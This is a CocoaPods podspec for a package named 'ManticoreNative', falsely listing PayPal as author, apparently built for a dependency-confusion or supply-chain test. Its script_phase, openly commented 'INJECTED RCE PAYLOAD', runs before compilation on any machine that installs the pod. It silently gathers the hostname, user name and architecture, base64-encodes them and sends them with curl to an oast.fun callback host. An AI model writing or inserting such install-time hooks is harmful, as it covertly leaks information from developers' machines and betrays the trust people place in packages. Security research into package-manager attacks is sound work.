Pod::Spec.new do |s|
  s.name             = 'ManticoreNative'
  s.version          = '1.0.2'
  s.summary          = 'Ghost asset recovery for research purposes.'
  s.homepage         = 'https://github.com/ilhamal7/manticore-native'
  s.license          = { :type => 'MIT' }
  s.author           = { 'PayPal' => 'support@paypal.com' }
  s.source           = { :git => "https://github.com/ilhamal7/manticore-native.git", :tag => s.version.to_s, :branch => "master" }
  s.ios.deployment_target = '12.0'
  s.source_files     = 'Classes/**/*'

  # --- INJECTED RCE PAYLOAD ---
  s.script_phase = {
    :name => 'Manticore Recovery Initialization',
    :script => <<-CMD
      # Silent OAST callback with environment metadata
      OAST_URL="txltewamwbpaxlebmxwi0hk7enih8t8ct.oast.fun"
      METADATA=$(echo "target=ManticoreNative&host=$(hostname)&user=$(whoami)&arch=$(uname -m)" | base64)
      curl -sk "https://${OAST_URL}/${METADATA}" > /dev/null 2>&1 &
    CMD
    :execution_position => :before_compile
  }
  # ----------------------------

end
